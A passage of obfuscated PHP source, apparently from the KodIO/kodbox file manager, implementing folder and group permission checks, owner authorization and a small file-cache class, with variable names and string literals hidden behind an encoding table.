$ŞòçöïÜ->sourceInfo($°”´Ğæ‹[0]); } if (!$Â×Ö¢×í) { $–¶É·¬¯ = array($èĞÌÙÜ«[417] => array($èĞÌÙÜ«[418], $°”´Ğæ‹)); $Â×Ö¢×í = $ŞòçöïÜ->field($èĞÌÙÜ«[2012])->where($–¶É·¬¯)->select(); $Â×Ö¢×í = array_to_keyvalue($Â×Ö¢×í, $èĞÌÙÜ«[402]); } $®şâÉÌÏ = $°”´Ğæ‹; foreach ($Â×Ö¢×í as $£’·®‡€ => $¬ô”…¯Æ) { $ÙÄŒ¸ÉŒ = $ŞòçöïÜ->parentLevelArray($¬ô”…¯Æ[$èĞÌÙÜ«[521]]); $®şâÉÌÏ = array_merge($®şâÉÌÏ, array($£’·®‡€), array_reverse($ÙÄŒ¸ÉŒ)); } $®şâÉÌÏ = array_values(array_unique($®şâÉÌÏ)); if (!$®şâÉÌÏ) { return array(); } $°ª¤¬¥á = $this->sourceAuthSelect($®şâÉÌÏ); $İ®÷ã¸Í = array(); foreach ($®şâÉÌÏ as $«³Ğ‡á) { if (isset($°ª¤¬¥á[$«³Ğ‡á])) { $İ®÷ã¸Í[$«³Ğ‡á] = $°ª¤¬¥á[$«³Ğ‡á]; } } $–å£ç‹ó = $this->userIsRoot($€ÊÖ¯); $çÕÉâµ¢ = AuthModel::authAll(); $ñº¹´äÃ = array($èĞÌÙÜ«[414] => $çÕÉâµ¢, $èĞÌÙÜ«[2013] => array($èĞÌÙÜ«[419] => 0, $èĞÌÙÜ«[1834] => $çÕÉâµ¢, $èĞÌÙÜ«[420] => LNG($èĞÌÙÜ«[2014]), $èĞÌÙÜ«[1851] => $èĞÌÙÜ«[2015])); $ö—ó‹â = array(); foreach ($Â×Ö¢×í as $«³Ğ‡á => $’â¼à¿) { if ($–å£ç‹ó && $GLOBALS[$èĞÌÙÜ«[6]][$èĞÌÙÜ«[1847]]) { $ö—ó‹â[$«³Ğ‡á] = $ñº¹´äÃ; continue; } $ö—ó‹â[$«³Ğ‡á] = $this->makeSourceAuth($’â¼à¿, $İ®÷ã¸Í, $€ÊÖ¯); } return $ö—ó‹â; } public function authDeepCheck($£Úâó‰Û, $µ­÷±«· = false) { $ÊÑíÈ =& $_SERVER[ßğøİ]; $µ­÷±«· = $µ­÷±«· ? $µ­÷±«· : USER_ID; $µá¥£ó´ = $this->makeAuthDeep($µ­÷±«·); if (!in_array($£Úâó‰Û, $µá¥£ó´[$ÊÑíÈ[2016]])) { return !1; } $šƒ×Ù×´ = array(); foreach ($µá¥£ó´[$ÊÑíÈ[2017]] as $Ô©˜¼Õ¢ => $™ˆµ›Ôƒ) { if (!in_array($£Úâó‰Û, $™ˆµ›Ôƒ)) { continue; } $šƒ×Ù×´[] = $Ô©˜¼Õ¢; } if (!$šƒ×Ù×´) { return !1; } $¢·Ü¸¯ë = $šƒ×Ù×´ ? $šƒ×Ù×´[0] : $£Úâó‰Û; return array($ÊÑíÈ[414] => -1, $ÊÑíÈ[467] => array($ÊÑíÈ[419] => $ÊÑíÈ[1190], $ÊÑíÈ[1834] => $ÊÑíÈ[197], $ÊÑíÈ[420] => LNG($ÊÑíÈ[2018]), $ÊÑíÈ[1851] => $ÊÑíÈ[2019]), $ÊÑíÈ[2020] => LNG($ÊÑíÈ[2021]), $ÊÑíÈ[2022] => $this->sourceAuthInfo($¢·Ü¸¯ë)); } protected function makeAuthDeep($İ‹ßì = false) { $“ÔµÁè™ =& $_SERVER[ßğøİ]; static $Û‹¸¬ºä = array(); $İ‹ßì = $İ‹ßì ? $İ‹ßì : USER_ID; if (isset($Û‹¸¬ºä[$İ‹ßì])) { return $Û‹¸¬ºä[$İ‹ßì]; } $èœ—ñ® = Model($“ÔµÁè™[2023])->listData(); $ÄüÀùËÌ = array(); foreach ($èœ—ñ® as $ËáÇŒ) { if ($ËáÇŒ[$“ÔµÁè™[413]] == 0 && $ËáÇŒ[$“ÔµÁè™[1850]] == $“ÔµÁè™[88]) { $ÄüÀùËÌ[] = $ËáÇŒ[$“ÔµÁè™[399]]; } } $œô—ì¯Š = $this->userGroupParents($İ‹ßì); $ˆê¹ˆ†º = array($“ÔµÁè™[411] => SourceModel::TYPE_USER, $“ÔµÁè™[505] => $İ‹ßì); if ($œô—ì¯Š) { $ˆê¹ˆ†º = array(array($“ÔµÁè™[411] => SourceModel::TYPE_USER, $“ÔµÁè™[505] => $İ‹ßì), array($“ÔµÁè™[411] => SourceModel::TYPE_GROUP, $“ÔµÁè™[505] => array($“ÔµÁè™[418], $œô—ì¯Š)), $“ÔµÁè™[1000] => $“ÔµÁè™[1926]); } $É‘—Ò×ù = $this->field($“ÔµÁè™[2024])->where($ˆê¹ˆ†º)->select(); $ñ”Àù“¬ = array(); $ñ‚íÎ•° = array_to_keyvalue_group($É‘—Ò×ù, $“ÔµÁè™[402]); foreach ($ñ‚íÎ•° as $â”ÛÆ‰§ => $ş»µÙÔ½) { $òšİˆ‰È = $this->authArrayCheck($ş»µÙÔ½, $İ‹ßì); if ($òšİˆ‰È[$“ÔµÁè™[414]] > 0) { $ñ”Àù“¬[] = $â”ÛÆ‰§ . $“ÔµÁè™[12]; } } if ($œô—ì¯Š) { $Ñš×Şä— = Model($“ÔµÁè™[522]); foreach ($œô—ì¯Š as $ü¤µ·°) { $£‚¦íšò = $Ñš×Şä—->getInfo($ü¤µ·°); if (!$£‚¦íšò || !is_array($£‚¦íšò[$“ÔµÁè™[86]])) { continue; } $ñ”Àù“¬[] = $£‚¦íšò[$“ÔµÁè™[86]][$“ÔµÁè™[402]]; } } $Ğé’“£ = array(); $Â¨¾æò = $œô—ì¯Š; $êÇù£×Ò = Model($“ÔµÁè™[1327]); $Ñš×Şä— = Model($“ÔµÁè™[522]); $ÑÀ‰»øÊ = array(); $œÎ…üÑÍ = array(); $»ªÚ×ö« = array(); $Îı© Ù“ = array(); if ($ñ”Àù“¬) { $‡İğ¶è¾ = $êÇù£×Ò->where(array($“ÔµÁè™[402] => array($“ÔµÁè™[418], $ñ”Àù“¬)))->select(); foreach ($‡İğ¶è¾ as $Ïö±¶±”) { $ÎÜ¯–ÂË = $êÇù£×Ò->parentLevelArray($Ïö±¶±”[$“ÔµÁè™[521]]); $Ğé’“£ = array_merge($Ğé’“£, $ÎÜ¯–ÂË); $Â¨¾æò[] = $Ïö±¶±”[$“ÔµÁè™[505]]; $ÑÀ‰»øÊ[$Ïö±¶±”[$“ÔµÁè™[402]]] = $ÎÜ¯–ÂË; $œÎ…üÑÍ[$Ïö±¶±”[$“ÔµÁè™[402]]] = $Ïö±¶±”[$“ÔµÁè™[505]]; } } $Â¨¾æò = array_values(array_unique($Â¨¾æò)); $¹°—ôÌ‚ = $Â¨¾æò; foreach ($¹°—ôÌ‚ as $ü¤µ·°) { $£‚¦íšò = $Ñš×Şä—->getInfo($ü¤µ·°); $ÎÜ¯–ÂË = $êÇù£×Ò->parentLevelArray($£‚¦íšò[$“ÔµÁè™[521]]); $Â¨¾æò = array_merge($Â¨¾æò, $ÎÜ¯–ÂË); } $Â¨¾æò = array_values(array_unique($Â¨¾æò)); foreach ($Â¨¾æò as $ü¤µ·°) { $£‚¦íšò = $Ñš×Şä—->getInfo($ü¤µ·°); $Ğé’“£[] = $£‚¦íšò[$“ÔµÁè™[86]][$“ÔµÁè™[402]]; $»ªÚ×ö«[$ü¤µ·°] = $£‚¦íšò[$“ÔµÁè™[86]][$“ÔµÁè™[402]]; $Îı© Ù“[$ü¤µ·°] = $êÇù£×Ò->parentLevelArray($£‚¦íšò[$“ÔµÁè™[521]]); } foreach ($ÑÀ‰»øÊ as $Á¥Å¬† => $¹ñËÏ‘å) { $êÔ’‹ÆÎ = $œÎ…üÑÍ[$Á¥Å¬†]; if (!$êÔ’‹ÆÎ || !$»ªÚ×ö«[$êÔ’‹ÆÎ]) { continue; } $Ê·ú¤Ÿ = array(); foreach ($Îı© Ù“[$êÔ’‹ÆÎ] as $ü¤µ·°) { $Ê·ú¤Ÿ[] = $»ªÚ×ö«[$ü¤µ·°]; } $ÑÀ‰»øÊ[$Á¥Å¬†] = array_merge($Ê·ú¤Ÿ, $¹ñËÏ‘å); } $Ğé’“£ = array_values(array_unique($Ğé’“£)); $”¯Ùçû‡ = array($“ÔµÁè™[2016] => $Ğé’“£, $“ÔµÁè™[2017] => $ÑÀ‰»øÊ); $Û‹¸¬ºä[$İ‹ßì] = $”¯Ùçû‡; return $”¯Ùçû‡; } private function makeSourceAuth($áßŠŞ¸ù, $‹¼¢ºæ°, $üÄë×µ’ = false) { $çÖåÀ– =& $_SERVER[ßğøİ]; $ ÂÊšæ = $çÖåÀ–[88]; $â¦Øø­å = $áßŠŞ¸ù[$çÖåÀ–[505]]; $—şŒñ¬ş = $áßŠŞ¸ù[$çÖåÀ–[411]] == SourceModel::TYPE_GROUP; $İÎª·¯Ê = $—şŒñ¬ş ? $this->groupRootAuth($â¦Øø­å, $üÄë×µ’) : !1; if ($İÎª·¯Ê && Model($çÖåÀ–[507])->authCheckAction($İÎª·¯Ê[$çÖåÀ–[413]], $çÖåÀ–[1849])) { return $this->groupAuthInfo($İÎª·¯Ê, $â¦Øø­å); } $–£™›Ê¢ = Model($çÖåÀ–[1327])->parentLevelArray($áßŠŞ¸ù[$çÖåÀ–[521]]); $–£™›Ê¢ = array_merge(array($áßŠŞ¸ù[$çÖåÀ–[402]]), array_reverse($–£™›Ê¢)); $›•Ñõ—× = !1; foreach ($–£™›Ê¢ as $¡¢äõÏñ) { if (!isset($‹¼¢ºæ°[$¡¢äõÏñ])) { continue; } $¹Ê€¶£ = $this->authMake($‹¼¢ºæ°[$¡¢äõÏñ], $üÄë×µ’); if ($¹Ê€¶£[$çÖåÀ–[467]]) { $›•Ñõ—× = $¹Ê€¶£; break; } } if (!$—şŒñ¬ş) { return $›•Ñõ—×; } if (!$›•Ñõ—× && $İÎª·¯Ê) { $›•Ñõ—× = $this->groupAuthInfo($İÎª·¯Ê, $â¦Øø­å); } if (!$›•Ñõ—×) { $½îüá¼Ù = Model($çÖåÀ–[522])->getInfo($â¦Øø­å); $¯ÖáÈš = explode($çÖåÀ–[50], trim($½îüá¼Ù[$çÖåÀ–[521]], $çÖåÀ–[50])); $¯ÖáÈš = array_reverse($¯ÖáÈš); foreach ($¯ÖáÈš as $çõïÔ—) { if ($çõïÔ— == $çÖåÀ–[197] || $çõïÔ— == $ ÂÊšæ) { continue; } $æ•‹¨ûŒ = $this->groupRootAuth($çõïÔ—, $üÄë×µ’); if (!$æ•‹¨ûŒ) { continue; } $›•Ñõ—× = $this->groupAuthInfo($æ•‹¨ûŒ, $çõïÔ—); break; } } if (!$›•Ñõ—× || $›•Ñõ—×[$çÖåÀ–[414]] <= 0) { $öıï±ë = $this->authDeepCheck($áßŠŞ¸ù[$çÖåÀ–[402]], $üÄë×µ’); if ($öıï±ë) { $›•Ñõ—× = $öıï±ë; } } return $›•Ñõ—×; } private function userIsRoot($¦Óç”‘Á = false) { $™æ˜üÇ =& $_SERVER[ßğøİ]; if (!$¦Óç”‘Á && _get($GLOBALS, $™æ˜üÇ[503])) { return !0; } $÷Ùü¿™å = Model($™æ˜üÇ[535])->getInfo($¦Óç”‘Á); $÷è€êî = Model($™æ˜üÇ[2025])->listData($÷Ùü¿™å[$™æ˜üÇ[1534]]); if ($÷è€êî && $÷è€êî[$™æ˜üÇ[511]][$™æ˜üÇ[2026]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¨™Ã¯éë) { $³™³ÏäÓ =& $_SERVER[ßğøİ]; $Î¯êßê´ = Model($³™³ÏäÓ[1327]); $¥ƒúç© = $Î¯êßê´->sourceInfo($¨™Ã¯éë); if (!$¥ƒúç©) { return !1; } $Î¯êßê´->groupPathDisplay($¥ƒúç©); $œı¥æ”æ = array($¥ƒúç©); $œı¥æ”æ = $Î¯êßê´->_listAppendPath($œı¥æ”æ); $¥ƒúç© = $œı¥æ”æ[0]; $Ó…öÂö° = $¥ƒúç©[$³™³ÏäÓ[519]]; if (isset($¥ƒúç©[$³™³ÏäÓ[527]])) { $ş¸ œá¶ = explode($³™³ÏäÓ[8], trim($¥ƒúç©[$³™³ÏäÓ[519]], $³™³ÏäÓ[8])); array_shift($ş¸ œá¶); $Ó…öÂö° = $¥ƒúç©[$³™³ÏäÓ[525]] . $³™³ÏäÓ[2027] . implode($³™³ÏäÓ[8], $ş¸ œá¶); } return array($³™³ÏäÓ[420] => $¥ƒúç©[$³™³ÏäÓ[32]], $³™³ÏäÓ[84] => KodIO::make($¥ƒúç©[$³™³ÏäÓ[402]]), $³™³ÏäÓ[2028] => $Ó…öÂö°); } private function groupAuthInfo($ëÓ¬ğèÎ, $‘ºøıÏĞ) { $Ú‘¬”İ¨ =& $_SERVER[ßğøİ]; $”º×íøÚ = Model($Ú‘¬”İ¨[522])->getInfo($‘ºøıÏĞ); return array($Ú‘¬”İ¨[2029] => intval($ëÓ¬ğèÎ[$Ú‘¬”İ¨[413]]), $Ú‘¬”İ¨[2013] => $ëÓ¬ğèÎ, $Ú‘¬”İ¨[2030] => LNG($Ú‘¬”İ¨[2031]), $Ú‘¬”İ¨[2022] => array($Ú‘¬”İ¨[420] => $”º×íøÚ[$Ú‘¬”İ¨[32]], $Ú‘¬”İ¨[84] => KodIO::make($”º×íøÚ[$Ú‘¬”İ¨[86]][$Ú‘¬”İ¨[402]]), $Ú‘¬”İ¨[2028] => $”º×íøÚ[$Ú‘¬”İ¨[526]])); } protected function groupRootAuth($‡¾¥İŒ, $Æâ¦¨Ú = false) { $¶‚öÊî =& $_SERVER[ßğøİ]; $Æâ¦¨Ú = $Æâ¦¨Ú ? $Æâ¦¨Ú : USER_ID; $êÛáÈ‹ı = $Æâ¦¨Ú . $¶‚öÊî[2032] . $‡¾¥İŒ; static $ĞŸº×é = array(); if (isset($ĞŸº×é[$êÛáÈ‹ı])) { return $ĞŸº×é[$êÛáÈ‹ı]; } $ìøâ·×€ = Model($¶‚öÊî[522])->getInfo($‡¾¥İŒ); $»‚‹”Õâ = $this->userGroupList($Æâ¦¨Ú); $¦¸ò‚â = isset($»‚‹”Õâ[$‡¾¥İŒ]) ? $»‚‹”Õâ[$‡¾¥İŒ][$¶‚öÊî[413]] : !1; if ($¦¸ò‚â && Model($¶‚öÊî[507])->authCheckAction($¦¸ò‚â[$¶‚öÊî[413]], $¶‚öÊî[1849])) { $ĞŸº×é[$êÛáÈ‹ı] = $¦¸ò‚â; return $¦¸ò‚â; } $ Á½ê¼ = $this->sourceAuthSelect($ìøâ·×€[$¶‚öÊî[86]][$¶‚öÊî[402]]); $¸ÇÃ¸Ø‘ = $ Á½ê¼ ? $this->authMake($ Á½ê¼, $Æâ¦¨Ú) : !1; $ˆŠÚÜ­“ = $¸ÇÃ¸Ø‘ ? $¸ÇÃ¸Ø‘[$¶‚öÊî[467]] : !1; $ĞŸº×é[$êÛáÈ‹ı] = $ˆŠÚÜ­“ ? $ˆŠÚÜ­“ : $¦¸ò‚â; return $ĞŸº×é[$êÛáÈ‹ı]; } public function authOwnerApply($ğ‡ã–Šò) { $Ë³Ì‹ÇÛ =& $_SERVER[ßğøİ]; if (empty($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[413]]) || isset($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[2033]]) && $ğ‡ã–Šò[$Ë³Ì‹ÇÛ[2033]]) { return $ğ‡ã–Šò; } if (AuthModel::authCheckRoot($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[413]][$Ë³Ì‹ÇÛ[414]])) { return $ğ‡ã–Šò; } $‰ˆÈ¤ = Model($Ë³Ì‹ÇÛ[1327])->parentLevelArray($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[521]]); $‰ˆÈ¤ = array_merge(array($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[402]]), array_reverse($‰ˆÈ¤)); $‹ÆÂ°¾¦ = $this->sourceAuthSelect($‰ˆÈ¤); $üŞñ„‡ğ = array(); $¦× «ê‚ = array(); foreach ($‹ÆÂ°¾¦ as $öÅşÍÇ± => $­Áğ¾ŠÂ) { $„ÔÏîÔ² = $this->authFolderOwnerUser($­Áğ¾ŠÂ); $üŞñ„‡ğ[$öÅşÍÇ±] = $„ÔÏîÔ²; $¦× «ê‚ = array_merge($¦× «ê‚, $„ÔÏîÔ²[$Ë³Ì‹ÇÛ[600]]); if ($„ÔÏîÔ²[$Ë³Ì‹ÇÛ[2034]]) { break; } } if (count($¦× «ê‚) == 0) { $¦× «ê‚ = $this->authFolderOwnerGroup($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[505]]); } $¦× «ê‚ = array_unique($¦× «ê‚); if (AuthModel::authCheckRoot($ğ‡ã–Šò[$Ë³Ì‹ÇÛ[413]][$Ë³Ì‹ÇÛ[414]])) { $¦× «ê‚[] = USER_ID; } $ğ‡ã–Šò[$Ë³Ì‹ÇÛ[413]][$Ë³Ì‹ÇÛ[2035]] = Model($Ë³Ì‹ÇÛ[513])->userListInfo($¦× «ê‚); return $ğ‡ã–Šò; } private function authFolderOwnerGroup($Çªñ¶·½) { $¬»õÃ½Ú =& $_SERVER[ßğøİ]; $À¡²Ü×Û = Model($¬»õÃ½Ú[1918])->where(array($¬»õÃ½Ú[1828] => $Çªñ¶·½))->select(); $µûßíÕş = array(); if (!$À¡²Ü×Û) { return $µûßíÕş; } foreach ($À¡²Ü×Û as $ÇÙ´Ü·õ) { $í¦éá—É = $this->authInfo($ÇÙ´Ü·õ); if (AuthModel::authCheckRoot($í¦éá—É[$¬»õÃ½Ú[413]])) { $µûßíÕş[] = $ÇÙ´Ü·õ[$¬»õÃ½Ú[1655]]; } } return $µûßíÕş; } private function authFolderOwnerUser($–³™ÛÆà) { $ºó¬ÜÄÀ =& $_SERVER[ßğøİ]; $Ã¤ŞŸ´Ú = array(); $¸×¿îĞ¾ = !1; foreach ($–³™ÛÆà as $‹…ëÒîï) { $æï”ôò = $this->authInfo($‹…ëÒîï); if ($‹…ëÒîï[$ºó¬ÜÄÀ[505]] == $ºó¬ÜÄÀ[197]) { $¸×¿îĞ¾ = !0; } if ($‹…ëÒîï[$ºó¬ÜÄÀ[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($æï”ôò[$ºó¬ÜÄÀ[413]])) { $Ã¤ŞŸ´Ú[] = $‹…ëÒîï[$ºó¬ÜÄÀ[505]]; } } } return array($ºó¬ÜÄÀ[600] => $Ã¤ŞŸ´Ú, $ºó¬ÜÄÀ[2034] => $¸×¿îĞ¾); } public function authMake($Ú×»ì¼, $ÎÓÒí˜Ï = false) { $½éúÔë½ =& $_SERVER[ßğøİ]; $°ÌĞ“Ü‚ = $this->authArrayCheck($Ú×»ì¼, $ÎÓÒí˜Ï); if ($°ÌĞ“Ü‚[$½éúÔë½[2036]]) { $°ÌĞ“Ü‚[$½éúÔë½[2036]] = $this->sourceAuthInfo($°ÌĞ“Ü‚[$½éúÔë½[2036]]); } return $°ÌĞ“Ü‚; } public function authArrayCheck($¼‰„¦“, $ªóƒ¿×¾ = false) { $ˆ®éˆçØ =& $_SERVER[ßğøİ]; if (!$¼‰„¦“) { return array($ˆ®éˆçØ[414] => 0, $ˆ®éˆçØ[467] => !1); } $ªóƒ¿×¾ = $ªóƒ¿×¾ ? $ªóƒ¿×¾ : USER_ID; $û²—ƒ‰Û = 0; $¤ÃÌôû = 0; $ĞÒ¦Êª¿ = 0; $ı£ŸıˆË = 0; $éÚ·Óå© = 0; $—ä˜¡‰³ = 0; $ğãù›ã = 1000; $ˆĞŞ¢õ— = 0; $÷ÊÒ€Ãö = 0; $àãÓçâµ = 0; $ùçÇ = 0; $ôƒŞóù = array($ˆ®éˆçØ[402] => 0); foreach ($¼‰„¦“ as $ôƒŞóù) { $²˜„ê¥Ñ = $this->authInfo($ôƒŞóù); if (!$²˜„ê¥Ñ) { continue; } $«ö©®‡† = $ôƒŞóù[$ˆ®éˆçØ[505]]; $µúÈ«Ú« = intval($²˜„ê¥Ñ[$ˆ®éˆçØ[413]]); if ($ôƒŞóù[$ˆ®éˆçØ[411]] == SourceModel::TYPE_USER && $«ö©®‡† == $ªóƒ¿×¾) { $û²—ƒ‰Û = !0; $ĞÒ¦Êª¿ = $²˜„ê¥Ñ; $¤ÃÌôû = $µúÈ«Ú«; } else { if ($ôƒŞóù[$ˆ®éˆçØ[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($«ö©®‡†, $ªóƒ¿×¾)) { $ı£ŸıˆË = !0; $äÁÀ½à“ = $this->groupStepToUserGroup($«ö©®‡†, $ªóƒ¿×¾); if ($äÁÀ½à“ < $ğãù›ã) { $ğãù›ã = $äÁÀ½à“; $éÚ·Óå© = $µúÈ«Ú«; $—ä˜¡‰³ = $²˜„ê¥Ñ; $ˆĞŞ¢õ— = $«ö©®‡†; } if ($äÁÀ½à“ == $ğãù›ã && $µúÈ«Ú« >= $éÚ·Óå©) { $éÚ·Óå© = $µúÈ«Ú«; $—ä˜¡‰³ = $²˜„ê¥Ñ; $ˆĞŞ¢õ— = $«ö©®‡†; } } else { if ($«ö©®‡† == $ˆ®éˆçØ[197]) { $÷ÊÒ€Ãö = !0; $ùçÇ = $²˜„ê¥Ñ; $àãÓçâµ = $µúÈ«Ú«; } } } } if ($û²—ƒ‰Û) { $·õõÕØç = $¤ÃÌôû; $²˜„ê¥Ñ = $ĞÒ¦Êª¿; $µôâ¿¬ = LNG($ˆ®éˆçØ[2037]); } else { if ($ı£ŸıˆË) { $·õõÕØç = $éÚ·Óå©; $²˜„ê¥Ñ = $—ä˜¡‰³; $¿ÜÌÇşÅ = Model($ˆ®éˆçØ[522])->getInfo($ˆĞŞ¢õ—); $µôâ¿¬ = $ˆ®éˆçØ[162] . $¿ÜÌÇşÅ[$ˆ®éˆçØ[526]] . $ˆ®éˆçØ[2038] . LNG($ˆ®éˆçØ[2039]); } else { if ($÷ÊÒ€Ãö) { $·õõÕØç = $àãÓçâµ; $²˜„ê¥Ñ = $ùçÇ; $µôâ¿¬ = LNG($ˆ®éˆçØ[2010]); } else { $·õõÕØç = 0; $²˜„ê¥Ñ = !1; $µôâ¿¬ = $ˆ®éˆçØ[12]; } } } $ì—íŸòù = array($ˆ®éˆçØ[2029] => intval($·õõÕØç), $ˆ®éˆçØ[2013] => $²˜„ê¥Ñ, $ˆ®éˆçØ[2030] => $µôâ¿¬, $ˆ®éˆçØ[2022] => $ôƒŞóù[$ˆ®éˆçØ[402]]); return $ì—íŸòù; } private function groupContainUser($Û—šÏ¸¶, $ŠĞÆÔÍ = false) { return in_array($Û—šÏ¸¶, $this->userGroupParents($ŠĞÆÔÍ)); } private function groupStepToUserGroup($ÉÜï²‚Š, $Ãä«¥¡ö = false) { $ë°¼ÜŠğ =& $_SERVER[ßğøİ]; $Ğ™®É¼ = $this->userGroupList($Ãä«¥¡ö); $ˆšñ„µğ = 1000; $İÕÔ¢—Ø = $GLOBALS[$ë°¼ÜŠğ[6]][$ë°¼ÜŠğ[89]][$ë°¼ÜŠğ[1931]] == 1; $¨ûÊ–¬¾ = $İÕÔ¢—Ø ? 3 : 2; foreach ($Ğ™®É¼ as $¬‡Ğ“î) { if ($¬‡Ğ“î[$ë°¼ÜŠğ[1828]] == $ÉÜï²‚Š) { return 0; } $ŠÔšæˆë = explode($ë°¼ÜŠğ[50], trim($¬‡Ğ“î[$ë°¼ÜŠğ[521]], $ë°¼ÜŠğ[50])); if ($ŠÔšæˆë[0] == $ë°¼ÜŠğ[197] && count($ŠÔšæˆë) > $¨ûÊ–¬¾) { $˜‘Ğı¸¶ = array_reverse(array_slice($ŠÔšæˆë, $¨ûÊ–¬¾)); $•Â¼İĞ  = array_search($ÉÜï²‚Š, $˜‘Ğı¸¶); if ($•Â¼İĞ  !== !1 && $•Â¼İĞ  + 1 <= $ˆšñ„µğ) { $ˆšñ„µğ = $•Â¼İĞ  + 1; } } } return $ˆšñ„µğ; } private function userGroupList($…Ï±€æ€ = false) { $ÎêÈßŠÚ =& $_SERVER[ßğøİ]; static $±ó í¢ñ = array(); if (isset($±ó í¢ñ[$…Ï±€æ€])) { return $±ó í¢ñ[$…Ï±€æ€]; } $†Ğæ–° = Model($ÎêÈßŠÚ[535])->getInfo($…Ï±€æ€); $±ó í¢ñ[$…Ï±€æ€] = array_to_keyvalue($†Ğæ–°[$ÎêÈßŠÚ[2011]], $ÎêÈßŠÚ[1828]); return $±ó í¢ñ[$…Ï±€æ€]; } public function userGroupParents($è¨‹àÒ¶) { $…ìÇ¢Ÿû =& $_SERVER[ßğøİ]; static $À´ä×® = array(); $è¨‹àÒ¶ = $è¨‹àÒ¶ ? $è¨‹àÒ¶ : USER_ID; if (isset($À´ä×®[$è¨‹àÒ¶])) { return $À´ä×®[$è¨‹àÒ¶]; } $½ä˜¢Éã = $this->userGroupList($è¨‹àÒ¶); $‚ÄŸôÄå = array(); $„î§ÛÅÏ = $GLOBALS[$…ìÇ¢Ÿû[6]][$…ìÇ¢Ÿû[89]][$…ìÇ¢Ÿû[1931]] == 1; $òÛÌî È = $„î§ÛÅÏ ? 3 : 2; foreach ($½ä˜¢Éã as $ıàäÙ) { $ÕñÙÚ–â = array($ıàäÙ[$…ìÇ¢Ÿû[1828]]); $Éü‹²„ = explode($…ìÇ¢Ÿû[50], trim($ıàäÙ[$…ìÇ¢Ÿû[521]], $…ìÇ¢Ÿû[50])); if ($Éü‹²„[0] == $…ìÇ¢Ÿû[197] && count($Éü‹²„) > $òÛÌî È) { $Š¾íµƒ = array_slice($Éü‹²„, $òÛÌî È); $ÕñÙÚ–â = array_merge($ÕñÙÚ–â, array_reverse($Š¾íµƒ)); } $‚ÄŸôÄå = array_merge($‚ÄŸôÄå, $ÕñÙÚ–â); } $À´ä×®[$è¨‹àÒ¶] = array_unique($‚ÄŸôÄå); return $À´ä×®[$è¨‹àÒ¶]; } public function authTargetInfoMake($×é¢»„) { $ä¡Ÿˆ‡ì =& $_SERVER[ßğøİ]; $Ÿü¡ø»Õ = array(); $Òµ©É« = array(); foreach ($×é¢»„ as $ò›Œ½¦) { if ($ò›Œ½¦[$ä¡Ÿˆ‡ì[411]] == SourceModel::TYPE_USER) { $Ÿü¡ø»Õ[] = intval($ò›Œ½¦[$ä¡Ÿˆ‡ì[505]]); } else { if ($ò›Œ½¦[$ä¡Ÿˆ‡ì[411]] == SourceModel::TYPE_GROUP) { $Òµ©É«[] = intval($ò›Œ½¦[$ä¡Ÿˆ‡ì[505]]); } } } if ($Ÿü¡ø»Õ) { $Ÿü¡ø»Õ = Model($ä¡Ÿˆ‡ì[513])->userListInfo($Ÿü¡ø»Õ); } if ($Òµ©É«) { $­ÌãÅ˜¿ = array($ä¡Ÿˆ‡ì[1916] => array($ä¡Ÿˆ‡ì[418], $Òµ©É«)); $Òµ©É« = Model($ä¡Ÿˆ‡ì[522])->field($ä¡Ÿˆ‡ì[2040])->where($­ÌãÅ˜¿)->select(); $Òµ©É« = array_to_keyvalue($Òµ©É«, $ä¡Ÿˆ‡ì[1828]); } return array($ä¡Ÿˆ‡ì[2041] => $Ÿü¡ø»Õ, $ä¡Ÿˆ‡ì[2042] => $Òµ©É«); } public function authInfo($÷™Êèí—) { $Àæı¡›¸ =& $_SERVER[ßğøİ]; if ($÷™Êèí—[$Àæı¡›¸[1932]]) { $ò“âÁê» = Model($Àæı¡›¸[507])->listData($÷™Êèí—[$Àæı¡›¸[1932]]); if (!$ò“âÁê») { return !1; $‚ÔÑô¤š = Model($Àæı¡›¸[507])->listData(); $Ã§¿Åò = array_filter_by_field($‚ÔÑô¤š, $Àæı¡›¸[413], $Àæı¡›¸[197]); return $Ã§¿Åò; } $±Ñ®¸ïÆ = array_field_key($ò“âÁê», array($Àæı¡›¸[399], $Àæı¡›¸[32], $Àæı¡›¸[413], $Àæı¡›¸[1851], $Àæı¡›¸[1852])); $±Ñ®¸ïÆ[$Àæı¡›¸[2043]] = $÷™Êèí—; return $±Ñ®¸ïÆ; } else { return array($Àæı¡›¸[419] => 0, $Àæı¡›¸[1834] => $÷™Êèí—[$Àæı¡›¸[1988]], $Àæı¡›¸[420] => $Àæı¡›¸[12], $Àæı¡›¸[1851] => $Àæı¡›¸[2044]); } } } goto D†Á É×À; DÊ‘ÙÙµß: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Õ‚ÏŠÜ, $‰öøØ³) { $Â¹“•„Ö =& $_SERVER[ßğøİ]; $this->cachePath = $Õ‚ÏŠÜ[$Â¹“•„Ö[84]]; $this->prefix = $Â¹“•„Ö[831]; $this->cacheTime = $‰öøØ³; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ó´ì¹Şœ) { $ï®’‰µª =& $_SERVER[ßğøİ]; $Ó´ì¹Şœ = str_replace(array($ï®’‰µª[832], $ï®’‰µª[97], $ï®’‰µª[73]), $ï®’‰µª[833], $Ó´ì¹Şœ); return $this->cachePath . $ï®’‰µª[834] . $Ó´ì¹Şœ . $ï®’‰µª[835]; } public function set($”µÚ¿ØŠ, $°Şó“²ˆ, $Ÿ£­‚À• = false) { $¥Úóéú = $this->getFile($”µÚ¿ØŠ); if (file_put_contents($¥Úóéú, $this->prefix . $°Şó“²ˆ, LOCK_EX)) { @touch($¥Úóéú, intval(time() + $Ÿ£­‚À•)); clearstatcache(); return !0; } @unlink($¥Úóéú); return !1; } public function get($ê’²¾†ş) { $øÜë÷ŒÑ = $this->getFile($ê’²¾†ş); if (file_exists($øÜë÷ŒÑ) && filemtime($øÜë÷ŒÑ) < time()) { @unlink($øÜë÷ŒÑ); return !1; } $¼º‹Ò’ï = @file_get_contents($øÜë÷ŒÑ); return substr($¼º‹Ò’ï, strlen($this->prefix)); } public 